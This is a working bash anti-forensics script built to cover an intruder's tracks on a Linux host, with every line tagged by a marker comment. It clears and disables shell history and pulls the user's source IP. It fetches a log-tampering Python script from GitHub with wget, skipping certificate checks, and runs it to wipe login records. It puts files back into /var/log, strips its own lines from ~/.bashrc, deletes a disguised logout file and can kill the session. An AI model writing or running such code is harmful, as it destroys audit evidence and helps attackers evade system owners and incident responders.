history -c ;  #_fdsagadsfasdgadsgsss
unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG;  #_fdsagadsfasdgadsgsss
export HISTFILE=/dev/null;  #_fdsagadsfasdgadsgsss
export HISTSIZE=0;  #_fdsagadsfasdgadsgsss
export HISTFILESIZE=0;  #_fdsagadsfasdgadsgsss
REST="\e[0m"  #_fdsagadsfasdgadsgsss
ColorYellow="\e[33m"  #_fdsagadsfasdgadsgsss
UNDERLINE="\e[4m" #_fdsagadsfasdgadsgsss
ColorBlue="\e[34m"  #_fdsagadsfasdgadsgsss
my_name="$(whoami)"  #_fdsagadsfasdgadsgsss
my_pts="$(who am i| awk '{print $2}' | xargs)" #_fdsagadsfasdgadsgsss
my_ip="$(last | grep "still" |  grep "$my_pts" | awk '{ print $3}' | xargs)" #_fdsagadsfasdgadsgsss
index_f='/tmp/._fadsgindexfs' #_fdsagadsfasdgadsgsss
clear_shell='/tmp/.asdgsdgdg_log_c' #_fdsagadsfasdgadsgsss
load_file='/tmp/.fadsgasdasdg_casdggd' #_fdsagadsfasdgadsgsss
function gglog {  #_fdsagadsfasdgadsgsss
    echo -e "${ColorBlue}[!]${REST} ${ColorYellow}$* ${REST}"  #_fdsagadsfasdgadsgsss
}  #_fdsagadsfasdgadsgsss
function _resume {  #_fdsagadsfasdgadsgsss
  if [ -f $index_f ];then #_fdsagadsfasdgadsgsss
    gglog "resume path in ${UNDERLINE} $(cat $index_f) ${REST}"  #_fdsagadsfasdgadsgsss
    for i in $(cat $index_f);  #_fdsagadsfasdgadsgsss
    do  #_fdsagadsfasdgadsgsss
       gglog /tmp/$(basename $i) "test" #_fdsagadsfasdgadsgsss
      if [ -f /tmp/$(basename $i) ];then  #_fdsagadsfasdgadsgsss
        mv /tmp/$(basename $i) /var/log/  2>/dev/null;  #_fdsagadsfasdgadsgsss
        if [ $? -eq 0 ];then  #_fdsagadsfasdgadsgsss
	        gglog $i " [ok]"  #_fdsagadsfasdgadsgsss
        fi   #_fdsagadsfasdgadsgsss
      fi   #_fdsagadsfasdgadsgsss
    done  #_fdsagadsfasdgadsgsss
  fi  #_fdsagadsfasdgadsgsss
}  #_fdsagadsfasdgadsgsss
if [ !  -f $clear_shell ];then  #_fdsagadsfasdgadsgsss
    wget --no-check-certificate  -q -c -t 3 'https://raw.githubusercontent.com/F0ckLinux/linux-clear/master/logtamper.py' -O $clear_shell;  #_fdsagadsfasdgadsgsss
    gglog "Download logtamper ok"  #_fdsagadsfasdgadsgsss
fi  #_fdsagadsfasdgadsgsss
function CL {  #_fdsagadsfasdgadsgsss
  if [[ $my_ip != "" ]];then #_fdsagadsfasdgadsgsss
  if [ -f $clear_shell ];then  #_fdsagadsfasdgadsgsss
  	  gglog "clear $my_name $ip_one"  #_fdsagadsfasdgadsgsss
      python $clear_shell -m 2 -u $my_name -i $my_ip ;  #_fdsagadsfasdgadsgsss
      python $clear_shell -m 1 -u $my_name -i $my_ip ;  #_fdsagadsfasdgadsgsss
  else  #_fdsagadsfasdgadsgsss
  	gglog "no cl to found"  #_fdsagadsfasdgadsgsss
  fi  #_fdsagadsfasdgadsgsss
  else #_fdsagadsfasdgadsgsss
    gglog "no need to clear login log" #_fdsagadsfasdgadsgsss
  fi #_fdsagadsfasdgadsgsss
}  #_fdsagadsfasdgadsgsss
function  _ki { #_fdsagadsfasdgadsgsss
  pkill -9 -t $1  #_fdsagadsfasdgadsgsss
} #_fdsagadsfasdgadsgsss
function ByeHack {    #_fdsagadsfasdgadsgsss
    sed -ie '/#_fdsagadsfasdgadsgsss$/d' ~/.bashrc;   #_fdsagadsfasdgadsgsss
    rm ~/.bash_1ogout;  #_fdsagadsfasdgadsgsss
    _resume && CL    #_fdsagadsfasdgadsgsss
    # CL    #_fdsagadsfasdgadsgsss
    if [ -f $index_f ];then #_fdsagadsfasdgadsgsss
      rm $index_f 2>/dev/null;    #_fdsagadsfasdgadsgsss
    fi #_fdsagadsfasdgadsgsss
    if [ -f $clear_shell ];then #_fdsagadsfasdgadsgsss
      rm $clear_shell 2>/dev/null;    #_fdsagadsfasdgadsgsss
    fi #_fdsagadsfasdgadsgsss
}  #_fdsagadsfasdgadsgsss
ByeHack;  #_fdsagadsfasdgadsgsss
if [[ $1 != "" ]];then #_fdsagadsfasdgadsgsss
  _ki $my_pts; #_fdsagadsfasdgadsgsss
fi #_fdsagadsfasdgadsgsss
